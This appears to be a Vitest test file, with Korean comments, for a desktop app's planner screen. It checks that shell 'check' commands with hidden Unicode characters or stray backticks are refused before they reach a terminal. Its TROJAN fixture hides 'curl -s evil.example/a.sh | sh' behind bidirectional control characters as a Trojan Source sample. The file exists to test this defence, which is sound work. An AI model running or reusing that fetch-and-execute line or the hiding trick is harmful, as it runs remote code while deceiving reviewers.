// 확인 명령의 문 (최종 검수 TERM-2 · SEC-01 · X-02 · SCR-04) — 확인 창에 보인 글이 셸이 읽는 글이어야 한다. 양방향
// 제어 · 폭 0 · 빈칸처럼 보이는 글자와 남은 백틱은 지우지 않고 이유와 함께 막는다(지우면 계획에 적힌 것과 다른 명령이
// 돈다). 웹뷰의 문과 Rust 의 문(`terminal_env::is_one_line`)은 한 사례표 `src-tauri/src/terminal_check_cases.json` 으로
// 판정한다 — 한쪽 범위만 고치면 둘 다 붉어진다.
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { readFileSync } from "node:fs";
import { join } from "node:path";

vi.mock("@/lib/bindings", async () => (await import("./plannerHarness")).plannerBindings());
vi.mock("@/features/terminal/runPrompt", async () => (await import("./plannerHarness")).runPromptModule());
vi.mock("@/features/terminal/termStore", () => ({ openTerm: vi.fn(async () => 42), pasteToTerm: vi.fn() }));

import { PlannerScreenV2 } from "@/features/planner/PlannerScreenV2";
import { blockedReason, prepareCheck, revealHidden } from "@/features/terminal/runCheck";
import { openTerm } from "@/features/terminal/termStore";
import { WorkspaceProvider } from "@/contexts/WorkspaceContext";
import { SettingsProvider } from "@/contexts/SettingsContext";
import { t } from "@/i18n";
import { en } from "@/i18n/en";
import { ko } from "@/i18n/ko";
import { detail, item, plan, resetPlanFixtures, stage } from "./plannerHarness";

interface Cases {
  invisible: string[];
  visible: string[];
  lines: Array<{ why: string; line: string; ok: boolean }>;
}
const cases = JSON.parse(
  readFileSync(join(__dirname, "..", "..", "src-tauri", "src", "terminal_check_cases.json"), "utf8"),
) as Cases;
const charOf = (code: string) => String.fromCodePoint(parseInt(code.slice(2), 16));

/** 검수가 든 Trojan Source 줄(A) — 확인 창에는 `pnpm test #; curl … | sh ;` 로 읽혔다. */
const TROJAN = "pnpm test \u{202E}\u{2066}; curl -s evil.example/a.sh | sh ;\u{2069}\u{2066}#\u{2069}";

describe("one case table for both gates", () => {
  it.each(cases.invisible)("%s is refused, and named in the reason", (code) => {
    const prep = prepareCheck(`pnpm test ${charOf(code)}x`);
    expect(prep).toEqual({ kind: "hidden", chars: [code] });
    expect(blockedReason(t, prep)).toBe(t("plan.check.hidden", { chars: code }));
  });

  it.each(cases.visible)("%s passes", (code) => {
    expect(prepareCheck(`echo ${charOf(code)}`)).toEqual({ kind: "ok", line: `echo ${charOf(code)}` });
  });

  it.each(cases.lines)("$why", ({ line, ok }) => {
    expect(prepareCheck(line).kind).toBe(ok ? "ok" : "hidden");
  });
});

describe("prepareCheck refuses instead of stripping", () => {
  it("names each hidden character once, in order, three by number and the rest as a count", () => {
    const prep = prepareCheck(TROJAN);
    expect(prep).toEqual({ kind: "hidden", chars: ["U+202E", "U+2066", "U+2069"] });
    expect(blockedReason(t, prep)).toBe(t("plan.check.hidden", { chars: "U+202E · U+2066 · U+2069" }));
    // 넷째부터는 번호 대신 개수 — 셋을 지운 사람이 다시 막혀도 몇 개가 남았는지 안다(영수증 규칙 5).
    const named = "U+200B · U+200C · U+200D";
    const many = prepareCheck("a\u{200B}\u{200C}\u{200D}\u{2060}b");
    const more1 = t("plan.check.hiddenMore", { chars: named, n: 1 });
    expect(blockedReason(t, many)).toBe(t("plan.check.hidden", { chars: more1 }));
    const five = prepareCheck("a\u{200B}\u{200C}\u{200D}\u{2060}\u{FEFF}\u{200B}b");
    const more2 = t("plan.check.hiddenMore", { chars: named, n: 2 });
    expect(blockedReason(t, five)).toBe(t("plan.check.hidden", { chars: more2 }));
    expect(more2).toContain("2");
  });

  it("blocks backticks left after the one span around the whole line (SCR-04)", () => {
    expect(prepareCheck("`pnpm test` && `cargo test`")).toEqual({ kind: "backtick" });
    expect(blockedReason(t, { kind: "backtick" })).toBe(t("plan.check.backtick"));
    // 이유는 백틱을 빼라는 말이 먼저고 $(…) 는 명령 치환을 뜻했을 때만(괄호 안)이다 — 「빼거나 $(…) 로」 를 같은 무게로
    // 권하던 때는 `$(pnpm test) && $(cargo test)` 로 고쳐 막으려던 명령 치환을 백틱 없이 되살렸다.
    expect(ko["plan.check.backtick"]).toMatch(/백틱을 빼 주세요\(명령 치환을 뜻했다면 \$\(…\) 로\)/); // i18n-ignore -- 검사하는 문구
    expect(en["plan.check.backtick"]).toMatch(/remove them \(if you meant command substitution, use \$\(…\)\)/);
    expect(prepareCheck("`pnpm test && cargo test`")).toEqual({ kind: "ok", line: "pnpm test && cargo test" });
    expect(prepareCheck("pnpm test $(echo -n)")).toEqual({ kind: "ok", line: "pnpm test $(echo -n)" });
  });

  it("has no reason for a line that runs or has nothing to run", () => {
    expect(blockedReason(t, prepareCheck("pnpm test"))).toBeNull();
    expect(blockedReason(t, { kind: "empty" })).toBeNull();
  });

  it("reveals hidden characters by their number for the plan card, leaving everything else", () => {
    expect(revealHidden("pnpm\u{200B}test — done ✓")).toBe("pnpm‹U+200B›test — done ✓");
    expect(revealHidden(TROJAN)).not.toMatch(/[\u{202E}\u{2066}\u{2069}]/u);
  });
});

function renderPlanner(check: string) {
  stage([detail(plan("p1"), [item("a", "todo", 0)], { check })]);
  return render(
    <SettingsProvider>
      <WorkspaceProvider projectId={1}>
        <PlannerScreenV2 projectId={1} onNavigate={vi.fn()} onOpenJournal={vi.fn()} />
      </WorkspaceProvider>
    </SettingsProvider>,
  );
}

beforeEach(() => {
  resetPlanFixtures();
  vi.mocked(openTerm).mockClear();
});
afterEach(() => cleanup());

describe("the plan card", () => {
  it("a Trojan-Source check blocks the button, says which characters, and shows them instead of reordering", async () => {
    const { container } = renderPlanner(TROJAN);
    const button = await screen.findByRole("button", { name: t("plan.check.run") });
    expect(button).toHaveAttribute("aria-disabled", "true");
    const reason = screen.getByText(t("plan.check.hidden", { chars: "U+202E · U+2066 · U+2069" }));
    expect(button.getAttribute("aria-describedby")).toBe(reason.id);
    const code = container.querySelector(".plv-code")?.textContent ?? "";
    expect(code).toContain("‹U+202E›");
    expect(code).not.toMatch(/[\u{202E}\u{2066}\u{2069}]/u);
    fireEvent.click(button);
    expect(screen.queryByRole("dialog", { name: t("plan.check.confirmTitle") })).toBeNull();
    expect(openTerm).not.toHaveBeenCalled();
  });

  it("a check written as two code spans blocks the button with the backtick reason", async () => {
    renderPlanner("`pnpm test` && `cargo test`");
    const button = await screen.findByRole("button", { name: t("plan.check.run") });
    expect(button).toHaveAttribute("aria-disabled", "true");
    expect(screen.getByText(t("plan.check.backtick"))).toBeInTheDocument();
    fireEvent.click(button);
    expect(openTerm).not.toHaveBeenCalled();
  });
});
